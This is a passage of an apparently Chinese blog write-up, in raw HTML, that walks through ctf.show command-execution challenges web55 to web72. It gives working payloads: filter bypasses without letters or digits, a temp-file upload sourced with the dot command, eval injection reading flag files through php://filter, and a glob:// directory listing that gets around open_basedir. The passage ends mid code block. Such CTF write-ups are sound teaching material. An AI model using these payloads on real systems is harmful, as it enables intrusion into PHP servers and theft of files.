class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://41d5615f-8af8-425d-af5e-b0efc6a90284.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.构造php文件进行上传</p>
<p>#!&#x2F;bin&#x2F;sh</p>
<p>ls</p>
<p>3.构造poc执行命令</p>
<p>?c&#x3D;.%20&#x2F;???&#x2F;????????[@-[]</p>
<p>4.上传请求包</p>
<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/image-20241203115953670.png" alt="image-20241203115953670"></p>
<p>可以看到有两个文件，接下来我们访问flag.php文件，把php文件内容改一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">cat flag.php</span><br></pre></td></tr></table></figure>

<p>即可获得flag!</p>
<h2 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h2><h3 id="无数字字母Rce"><a href="#无数字字母Rce" class="headerlink" title="#无数字字母Rce"></a>#无数字字母Rce</h3><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729867285696-8ef1f841-4da9-4137-9fe6-893735bb43a5.webp" alt="image.png"></p>
<p><strong>先看看哪些字符是可以用的</strong></p>
<p><strong>用php脚本</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#输出可用字符</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>,<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#可用字符:# ) * + , - . / : = ? @ [ \ ] ^ _ | &#125; ~ </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>没有被过滤的字符:# ) * + , - . &#x2F; : &#x3D; ? @ [ \ ] ^ _ | } ~ </p>
<p>因为没有过滤. 而点命令在linux中是source的缩写，通过点命令，我们可以在没有执行权限的情况下执行sh命令。</p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路:"></a>解题思路:</h3><p>通过POST上传一个文件，文件内容是要执行的命令，并且同时点命令执行该文件，形成条件竞争。这个文件默认保存在&#x2F;tmp&#x2F;phpxxxx路径下，所以可以通过&#x2F;???&#x2F;????????[@-[] 来构成这个路径，[@-[]为匹配ascii码范围在@-[的字符（A，Z被屏蔽，所以范围大一位），之所以用[@-[]是因为直接用&#x2F;???&#x2F;?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母。就算这样，也不一定能够准确地匹配到我们的上传文件，所以可能要多次刷新。</p>
<p>1.构造POST数据包或使用postman传递</p>
<p>构造数据包</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://227f0ddd-0640-4c46-b921-4a7fb674c137.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>2.编写php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line">ls</span><br></pre></td></tr></table></figure>

<p>3.构造poc执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=.%20/???/????????[@-[]</span><br></pre></td></tr></table></figure>

<p>之所以用[@-[]是因为直接用&#x2F;???&#x2F;?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母。就算这样，也不一定能够准确地匹配到我们的上传文件，所以可能要多次刷新。</p>
<p>4.上传文件然后用bp抓包，加上poc执行命令，然后发送</p>
<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729930351348-50661fd2-280a-40ee-9b87-e304bceceb02.png" alt="img"></p>
<p>看到flag.php了，修改php文件命令继续上传</p>
<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729930528011-c8cc956f-2e2d-45f0-9afd-b64644576961.png" alt="img"></p>
<p>拿到flag！</p>
<h2 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h2><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729930831607-9a87b068-075d-4221-89c7-adac1f189207.webp" alt="image.png"></p>
<p>先看看能用哪些字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">! # $ ( ) + / : @ \ ] ^ _ &#123; | &#125; ~ </span><br></pre></td></tr></table></figure>

<p>.号被过滤了，不能用bash命令，那就另辟出路</p>
<h3 id="解题思路-利用linux的-构造出36"><a href="#解题思路-利用linux的-构造出36" class="headerlink" title="解题思路:利用linux的$(())构造出36"></a>解题思路:利用linux的$(())构造出36</h3><p>利用linux的$(())构造出36</p>
<p>$(())&#x3D;0</p>
<p>$((~ $(()) ))&#x3D;-1</p>
<p>通过<code>$(())</code>操作构造出36： <code>$(())</code> ：代表做一次运算，因为里面为空，也表示值为0</p>
<p><code>$(( ~$(()) )) </code>：对0作取反运算，值为-1</p>
<p><code>$(( $((~$(()))) $((~$(()))) ))</code>： -1-1，也就是(-1)+(-1)为-2，所以值为-2</p>
<p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>：再对-2做一次取反得到1，所以值为1</p>
<p>故我们在<code>$(( ~$(( )) ))</code>里面放37个<code>$((~$(())))</code>，得到-37，取反即可得到36:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">get_reverse_number = <span class="string">&quot;$((~$((&#123;&#125;))))&quot;</span> <span class="comment"># 取反操作</span></span><br><span class="line">negative_one = <span class="string">&quot;$((~$(())))&quot;</span>        <span class="comment"># -1</span></span><br><span class="line">payload = get_reverse_number.<span class="built_in">format</span>(negative_one*<span class="number">37</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>

<h2 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h2><p>以58为例</p>
<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729939289573-10e3b495-d4a3-4352-bc6a-0273394c441d.png" alt="img"></p>
<h2 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h2><p>eval() 函数把字符串按照 PHP 代码来计算。该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
<p>使用方法：eval(php代码)</p>
<p>简单来说这里是远程代码注入的rce</p>
<p>用bp抓包，修改请求方法为POST，send了几次之后发现system()函数，passthru()函数都是被禁用了的，但后来发现highlight_file()函数没有被过滤，所以采用highlight_file()函数</p>
<h2 id="两种解法"><a href="#两种解法" class="headerlink" title="两种解法"></a>两种解法</h2><h3 id="highlight-file函数查看"><a href="#highlight-file函数查看" class="headerlink" title="highlight_file函数查看"></a>highlight_file函数查看</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=highlight_file(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li>highlight_file()函数是 PHP 中用于语法高亮显示文件源代码的一个函数。它读取指定的文件，并返回带有 HTML 语法高亮标记的源代码</li>
</ul>
<h3 id="include-伪协议"><a href="#include-伪协议" class="headerlink" title="include+伪协议"></a>include+伪协议</h3><p>c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<h3 id="无参数读取"><a href="#无参数读取" class="headerlink" title="无参数读取"></a>无参数读取</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<h3 id="show-source-函数"><a href="#show-source-函数" class="headerlink" title="show_source()函数"></a>show_source()函数</h3><p>是 PHP 中用于显示 PHP 源代码的一个函数</p>
<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729944668855-0fe90f7c-dd74-4ee4-839b-e4cf8b1b5dda.png" alt="img"></p>
<p>是可以拿到flag的哈</p>
<h1 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h1><p>这次的题目是一样的，但过滤不太一样，show_source()函数被过滤了</p>
<p>那就用highlight_file()函数看看</p>
<p>结果发现…..</p>
<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729950081135-53bb1560-59bd-49e8-97fe-99ff9ac5d903.png" alt="img"></p>
<p>用参数输入include做也是一样</p>
<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729950239757-90e70843-021d-4099-b21d-a8f4acb3d3d4.png" alt="img"></p>
<p>侮辱性极强，看我们拿下他</p>
<p>既然不在这个文件里面，那我们扫一下目录</p>
<p>打印目录：print_r(scandir(“&#x2F;“));&#x2F;&#x2F;如果不在网站目录，就往前找使用..&#x2F;</p>
<h3 id="scandir-函数"><a href="#scandir-函数" class="headerlink" title="scandir()函数"></a>scandir()函数</h3><ul>
<li><p><strong>功能</strong>：返回指定目录中的文件和目录数组。</p>
</li>
<li><p><strong>用法</strong>：<code>$files = scandir($directory, $sorting_order);</code></p>
</li>
<li><p><code>$directory</code> 是你想要扫描的目录的路径。</p>
</li>
<li><p><code>$sorting_order</code> 是可选的排序顺序，可以是 <code>SCANDIR_SORT_ASCENDING</code>（升序，默认值），<code>SCANDIR_SORT_DESCENDING</code>（降序），<code>SCANDIR_SORT_NONE</code>（不排序）。</p>
</li>
<li><p>返回值是一个包含目录中所有文件和目录名称的数组（包括 <code>.</code> 和 <code>..</code>），如果失败则返回 <code>false</code>。</p>
</li>
</ul>
<h3 id="readdir-函数"><a href="#readdir-函数" class="headerlink" title="readdir()函数"></a><code>readdir()</code>函数</h3><ul>
<li><p><strong>功能</strong>：从已经打开的目录中读取下一个文件的名称。</p>
</li>
<li><p><strong>用法</strong>：<code>$filename = readdir($handle);</code></p>
</li>
<li><p><code>$handle</code> 是之前通过 <code>opendir()</code> 打开的目录句柄。</p>
</li>
<li><p>返回值是目录中下一个文件的名称（字符串），如果已经读取到目录末尾或出错则返回 <code>false</code>。</p>
</li>
</ul>
<h3 id="opendir-函数"><a href="#opendir-函数" class="headerlink" title="opendir()函数"></a><code>opendir()</code>函数</h3><ul>
<li><p><strong>功能</strong>：打开一个目录句柄，供其他目录函数使用。</p>
</li>
<li><p><strong>用法</strong>：<code>$handle = opendir($path);</code></p>
</li>
<li><p><code>$path</code> 是你想要打开的目录的路径。</p>
</li>
<li><p>返回值是一个目录句柄（resource 类型），如果失败则返回 <code>false</code>。</p>
</li>
</ul>
<p>先用scandir列根目录内容，用print_r回显。</p>
<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729950731355-ef566b34-560f-4f25-9071-6b68a5f98500.png" alt="img"></p>
<p>看到一个flag.txt</p>
<p>最后正常查看这个文件就行(记得flag.txt是在根目录，所以应该是highlight_file(‘&#x2F;flag.txt’))</p>
<p>另外的:新思路：PHP原生类可遍历目录 c&#x3D;$dir&#x3D;new DirectoryIterator(“&#x2F;“);echo $dir; (url编码：c&#x3D;%24dir%3dnew%20DirectoryIterator(%22%2f%22)%3b%0aforeach(%24dir%20as%20%24f)%7b%0a%20%20%20%20echo(%24f.’%3cbr%3e’)%3b%7d)</p>
<h1 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h1><p>这次print_r()函数被禁用了，我们换一个</p>
<p>c&#x3D;var_dump(scandir(‘&#x2F;‘));</p>
<p>c&#x3D;var_export(scandir(‘&#x2F;‘));</p>
<h2 id="print-r-函数替换函数"><a href="#print-r-函数替换函数" class="headerlink" title="print_r()函数替换函数"></a>print_r()函数替换函数</h2><h3 id="var-dump"><a href="#var-dump" class="headerlink" title="var_dump()"></a>var_dump()</h3><ul>
<li><code>var_dump()</code> 提供了比 <code>print_r()</code> 更详细的信息，包括变量的类型和长度（对于字符串）。</li>
<li>它对于调试非常有用，因为它显示了更多关于变量的内部信息</li>
</ul>
<h3 id="var-export"><a href="#var-export" class="headerlink" title="var_export()"></a>var_export()</h3><ul>
<li><code>var_export()</code> 返回或输出关于变量的字符串表示，这个表示可以作为有效的 PHP 代码来执行（如果变量是数组或对象的话，可能会需要一些调整）。</li>
<li>它对于生成代码示例或配置数据很有用。</li>
</ul>
<h1 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h1><p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729951980194-9294209a-ac98-459a-85da-447bbaf62f7c.png" alt="img"></p>
<p>直接提示highlight_file()函数不能用了</p>
<p>没关系，那就用其他的</p>
<p>c&#x3D;readgzfile(“&#x2F;flag.txt”);</p>
<h3 id="readgzfile-函数"><a href="#readgzfile-函数" class="headerlink" title="readgzfile()函数"></a>readgzfile()函数</h3><p>是 PHP 中用于读取整个 gzip 压缩文件的内容，并将其作为字符串返回的函数。这个函数不会直接输出文件内容到浏览器或终端，而是将内容存储在变量中供后续使用。</p>
<p>c&#x3D;require(“&#x2F;flag.txt”);</p>
<h3 id="require-函数"><a href="#require-函数" class="headerlink" title="require()函数"></a>require()函数</h3><p>是 PHP 中用于包含并运行指定文件的一个语句。与 <code>include()</code> 函数类似，<code>require()</code> 也会将指定文件的内容包含到当前脚本中</p>
<p>c&#x3D;include(“&#x2F;flag.txt”);</p>
<h3 id="include-函数"><a href="#include-函数" class="headerlink" title="include()函数"></a>include()函数</h3><p>include()可以引入并执行一个指定的文件的内容，如果那个被引入的文件包含了HTML代码或PHP代码，这些代码会在当前的脚本中执行，从而间接地在最终的输出中显示内容。</p>
<p>也可以用参数输入include+伪协议来做</p>
<p>c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt</p>
<h1 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h1><p>跟68一样的提示</p>
<p>先试试老方法</p>
<p>这次不能用var_dump()函数了，我们换成var_export()是可以用的</p>
<h1 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h1><p>查看题目</p>
<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729997334358-8ae6bb16-2dc7-4263-980c-1008b43c8bbf.png" alt="img"></p>
<p>这次新增了两个函数哈，我们先逐个了解一下</p>
<h3 id="error-reporting-函数"><a href="#error-reporting-函数" class="headerlink" title="error_reporting() 函数"></a>error_reporting() 函数</h3><p><code>error_reporting()</code> 函数是 PHP 中用于设置错误报告级别的函数。它允许你控制哪些类型的错误、警告和通知会被显示出来。这个函数对于开发和调试过程特别有用，因为它允许开发者根据需要调整错误报告的详细程度。</p>
<h3 id="ini-set-函数"><a href="#ini-set-函数" class="headerlink" title="ini_set()函数"></a><strong>ini_set()函数</strong></h3><p><code>ini_set()</code> 函数是 PHP 中用于设置配置选项（ini 配置指令）的值的一个函数。这些配置选项通常位于 <code>php.ini</code> 文件中，但 <code>ini_set()</code> 允许你在运行时动态地更改这些设置，而无需修改 <code>php.ini</code> 文件本身。</p>
<p>目前来看是对题目没啥用，我们正常解看看</p>
<p>发现还是可以正常做出来的，那就没什么好讲的</p>
<h1 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h1><p>查看题目，好像跟之前的不太一样</p>
<p>有一个index.php文件，下载看看</p>
<p><img src="/./../image/achieve/202411/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C--ctfshow/1729998377034-05e78540-dc5c-420b-8134-b9eca1e5b3b1.png" alt="img"></p>
<h3 id="s-ob-get-contents"><a href="#s-ob-get-contents" class="headerlink" title="$s &#x3D; ob_get_contents();"></a>$s &#x3D; ob_get_contents();</h3><ul>
<li>这行代码获取当前输出缓冲区的内容，并将其存储在变量<code>$s</code>中。输出缓冲允许你临时存储输出而不是直接发送到浏览器。这通常用于在发送最终输出之前进行进一步的处理或修改。</li>
</ul>
<h3 id="ob-end-clean"><a href="#ob-end-clean" class="headerlink" title="ob_end_clean();"></a>ob_end_clean();</h3><ul>
<li>这行代码结束当前的输出缓冲并丢弃缓冲内容（尽管我们已经将其保存在<code>$s</code>中）。这意味着在调用<code>ob_end_clean()</code>之后，任何新的输出将直接发送到浏览器，而不是被缓冲。</li>
</ul>
<p>echo preg_replace(“&#x2F;[0-9]|[a-z]&#x2F;i”,”?”,$s);</p>
<ul>
<li>这行代码使用<code>preg_replace()</code>函数对变量<code>$s</code>的内容进行正则表达式替换。它查找所有数字（0-9）和小写字母（a-z），并将它们替换为问号（”?”）。正则表达式中的<code>i</code>修饰符表示不区分大小写，但在这个特定的表达式中，由于只指定了小写字母，所以<code>i</code>实际上没有作用。最终，处理后的字符串通过<code>echo</code>输出。</li>
</ul>
<h3 id="对缓冲区的理解"><a href="#对缓冲区的理解" class="headerlink" title="对缓冲区的理解"></a>对缓冲区的理解</h3><p>在 <code>eval()</code> 执行后，这行代码获取当前输出缓冲区的内容，并将其存储在变量 <code>$s</code> 中。输出缓冲区可能包含由 <code>$c</code> 中的代码生成的任何输出。</p>
<p>所以这段代码的目的是捕获执行 <code>$c</code> 中的代码后产生的输出，然后对这个输出进行处理（即替换掉所有的数字和小写字母），而不是直接处理 <code>$c</code> 中的代码字符串本身。</p>
<p>当PHP脚本执行时，它可能会生成各种输出，比如HTML内容、文本、图像等。默认情况下，这些输出会立即发送到客户端（如浏览器）。但是，通过使用输出缓冲函数，PHP允许开发者将这些输出先存储在内存中的一个缓冲区中，而不是立即发送。</p>
<p>那我们应该做的有两件事:</p>
<p>1.绕过正则匹配</p>
<p>2.绕过缓冲区</p>
<p>这里我们只需要提前退出缓冲区就可以避免我们eval执行的代码输出的内容经过正则匹配，因此不需要绕过正则匹配</p>
<h2 id="对于绕过缓冲区"><a href="#对于绕过缓冲区" class="headerlink" title="对于绕过缓冲区"></a>对于绕过缓冲区</h2><h3 id="1-提前送出缓冲区"><a href="#1-提前送出缓冲区" class="headerlink" title="1.提前送出缓冲区"></a>1.提前送出缓冲区</h3><p>可用的函数:</p>
<h4 id="ob-flush-函数"><a href="#ob-flush-函数" class="headerlink" title="ob_flush()函数"></a>ob_flush()函数</h4><p><code>ob_flush()</code> 函数在 PHP 中用于刷新（输出）当前输出缓冲区的内容。当输出缓冲被激活时（通常通过 <code>ob_start()</code> 函数），PHP 脚本的输出不会立即发送到客户端（如浏览器），而是先存储在内部缓冲区中。<code>ob_flush()</code> 函数会将缓冲区的内容发送到客户端，但不一定清空缓冲区本身，这取决于 PHP 的配置和输出缓冲机制的状态。</p>
<h4 id="flush-函数"><a href="#flush-函数" class="headerlink" title="flush()函数"></a>flush()函数</h4><ul>
<li><code>flush()</code> 函数尝试将输出缓冲区的内容发送到客户端。但是，如果 PHP 的输出缓冲和 Web 服务器的输出缓冲同时被激活，<code>flush()</code> 可能不会清空 PHP 的输出缓冲区，只会尝试清空 Web 服务器的输出缓冲区。</li>
<li><code>ob_flush()</code> 函数确保 PHP 的输出缓冲区内容被发送到客户端。如果同时调用了 <code>flush()</code>，则可能尝试同时清空 PHP 和 Web 服务器的输出缓冲区。</li>
</ul>
<h4 id="ob-end-flush-函数"><a href="#ob-end-flush-函数" class="headerlink" title="ob_end_flush()函数"></a>ob_end_flush()函数</h4><p><code>ob_end_flush();</code> 函数在 PHP 中用于结束当前的输出缓冲区，并将缓冲区的内容发送到客户端（如浏览器）。这个函数结合了 <code>ob_end_clean();</code> 和 <code>ob_flush();</code> 的功能：它首先会发送缓冲区的内容（如果缓冲区不为空），然后关闭（结束）当前的输出缓冲块。</p>
<ol>
<li><strong>与</strong> <code>**ob_end_clean();**</code> <strong>的区别</strong>：</li>
</ol>
<ul>
<li><code>ob_end_clean();</code> 只是清空（丢弃）缓冲区的内容，并不发送它到客户端。</li>
<li><code>ob_end_flush();</code> 则会发送内容，并结束缓冲。</li>
</ul>
<ol>
<li><strong>与</strong> <code>**ob_flush();**</code> <strong>的区别</strong>：</li>
</ol>
<ul>
<li><code>ob_flush();</code> 只会发送缓冲区的内容到客户端，但不会结束缓冲块。这意味着缓冲区仍然存在，之后的输出仍然可以被添加到这个缓冲区中（直到另一个 <code>ob_end_...</code> 函数被调用）。</li>
</ul>
<h3 id="2-结束程序"><a href="#2-结束程序" class="headerlink" title="2.结束程序"></a>2.结束程序</h3><p>提前终止程序，即执行完代码直接退出，可以调用的函数有：</p>
<h4 id="exit-函数"><a href="#exit-函数" class="headerlink" title="exit()函数"></a>exit()函数</h4><ul>
<li>当 <code>exit()</code> 被调用时，PHP 脚本会立即停止执行，后面的代码将不会被运行。</li>
<li><code>exit()</code> 函数在 PHP 中用于终止脚本的执行。当 <code>exit()</code> 被调用时，脚本会立即停止运行，并且不再执行后面的代码。此外，<code>exit()</code> 函数还可以选择性地输出一条消息到客户端（如浏览器）。</li>
</ul>
<h4 id="die-函数"><a href="#die-函数" class="headerlink" title="die()函数"></a>die()函数</h4><p><code>die()</code> 函数的行为实际上与 exit() 函数完全相同；它们都可以用来终止脚本，并且都可以接受一个可选的字符串参数作为要输出的消息。在 PHP 文档中，<code>die()</code> 函数有时被描述为 <code>exit()</code> 函数的别名，专门用于在出现致命错误时终止脚本。</p>
<p>payload示例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit();</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);die();</span><br></pre></td></tr></table></figure>

<p>所以以上两个方法，都只是在原来的dpayload后面加上对应的函数就可以了，做法其实大同小异</p>
<h2 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h2><p>正常的用71的方法做一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit();</span><br></pre></td></tr></table></figure>

<p>发现scandir()函数不能用了，不能正常查看目录</p>
<p>后来查过报错后发现这个错误信息显示的是在尝试使用 <code>scandir()</code> 函数打开一个目录时，操作没有被允许。这通常是因为当前运行 PHP 脚本的用户没有足够的权限去访问指定的目录。这是由于 open_basedir 限制，这个操作被禁止了。open_basedir 是 PHP 的一个安全配置指令，用来限制 PHP 脚本只能访问特定的目录。</p>
<p>当前配置只允许访问 &#x2F;var&#x2F;www&#x2F;html&#x2F; 目录及其子目录，但不允许访问其他目录。</p>
<p>解题思路:</p>
<p>此题过滤了scandir(),readdir(),opendir()</p>
<p>首先要查看flag所在的地方，这里可以用glob伪协议，此协议筛选目录不受open_basedir的制约</p>
<p>PHP 的 <code>glob()</code> 函数，它用于查找与指定模式匹配的文件路径。<code>glob()</code> 函数返回一个包含匹配文件或目录的数组，或者在没有匹配项时返回 <code>false</code></p>
<h3 id="1、目录文件扫描"><a href="#1、目录文件扫描" class="headerlink" title="1、目录文件扫描"></a>1、目录文件扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c= ?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;); foreach($a as $f) &#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0); ?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);//*创建一个DirectoryIterator对象，遍历根目录*</span><br><span class="line"></span><br><span class="line">foreach($a as $f)//*// 遍历每个条目*</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   echo($f-&gt;__toString().&#x27; &#x27;);//*// 